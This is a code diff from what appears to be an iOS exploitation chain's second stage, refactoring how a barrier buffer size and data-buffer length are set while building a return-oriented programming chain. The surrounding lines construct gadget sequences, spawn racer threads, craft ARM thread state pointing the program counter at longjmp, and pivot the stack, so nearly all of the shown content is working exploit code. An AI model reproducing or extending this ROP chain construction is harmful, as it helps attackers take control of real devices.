@@ -575,9 +575,6 @@ void build_databuffer(offset_struct_t * offsets, rop_var_t * ropvars) {
 }
 
 void stage2(jake_img_t kernel_symbols, offset_struct_t * offsets,char * base_dir) {
-
-	// TODO: the stage2_databuffer_len should be set in install.m
-	offsets->stage2_databuffer_len = 0x10000;
 	offsets->stage2_databuffer = malloc(offsets->stage2_databuffer_len);
 	memset(offsets->stage2_databuffer,0,offsets->stage2_databuffer_len); // make sure everything is inited to 0
 
@@ -944,8 +941,7 @@ void stage2(jake_img_t kernel_symbols, offset_struct_t * offsets,char * base_dir
 	ROP_VAR_CPY_W_OFFSET("client",0,"service_open_request",offsetof(struct ServiceOpen_Reply,connection.name),sizeof(mach_port_t));
 
 
-	// TODO: move that into install.m or somewhere else (prob even better to put it into offsets straight away)
-#define BARRIER_BUFFER_SIZE 0x10000
+
 	// spawn racer threads
 	
 	// TODO: move this struct into a seperate file
@@ -965,7 +961,7 @@ _STRUCT_ARM_THREAD_STATE64
 	_STRUCT_ARM_THREAD_STATE64 * new_thread_state = malloc(sizeof(_STRUCT_ARM_THREAD_STATE64));
 	memset(new_thread_state,0,sizeof(_STRUCT_ARM_THREAD_STATE64));
 	new_thread_state->__pc = offsets->longjmp-0x180000000+offsets->new_cache_addr; /*slide it here*/ // we will point pc to longjump so that we can get into rop again easily
-	new_thread_state->__x[0] = offsets->stage2_base+offsets->stage2_max_size+BARRIER_BUFFER_SIZE /*x0 should point to the longjmp buf*/; // this means we can easily just use a longjump buf at the front of the thread to control all regs
+	new_thread_state->__x[0] = offsets->stage2_base+offsets->stage2_max_size+offsets->stage2_barrier_buffer_size /*x0 should point to the longjmp buf*/; // this means we can easily just use a longjump buf at the front of the thread to control all regs
 	DEFINE_ROP_VAR("thread_state",sizeof(_STRUCT_ARM_THREAD_STATE64),new_thread_state)
 	ROP_VAR_ARG_HOW_MANY(3);
 	ROP_VAR_ARG64("self",1);
@@ -1417,7 +1413,7 @@ _STRUCT_ARM_THREAD_STATE64
 
 	// SECOND THREAD STACK STARTS HERE
 	// we basically use this large barrier to make sure that we don't accidentally smash the first thread buffer with this one by pushing to many frames in this one
-	ADD_BARRIER(offsets->stage2_base + offsets->stage2_max_size + BARRIER_BUFFER_SIZE);
+	ADD_BARRIER(offsets->stage2_base + offsets->stage2_max_size + offsets->stage2_barrier_buffer_size);
  
 
 	// longjmp buf, pivoting everything
@@ -1434,7 +1430,7 @@ _STRUCT_ARM_THREAD_STATE64
     ADD_GADGET(); /* x29 */
     ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 */ 
     ADD_GADGET(); /* x29 */ 
-    ADD_STATIC_GADGET(offsets->stage2_base + offsets->stage2_max_size + BARRIER_BUFFER_SIZE+22*8 /*jump over that longjmp buffer here*/); /* x2 */ 
+    ADD_STATIC_GADGET(offsets->stage2_base + offsets->stage2_max_size + offsets->stage2_barrier_buffer_size+22*8 /*jump over that longjmp buffer here*/); /* x2 */ 
     ADD_GADGET(); /* D8 */
     ADD_GADGET(); /* D9 */
     ADD_GADGET(); /* D10 */
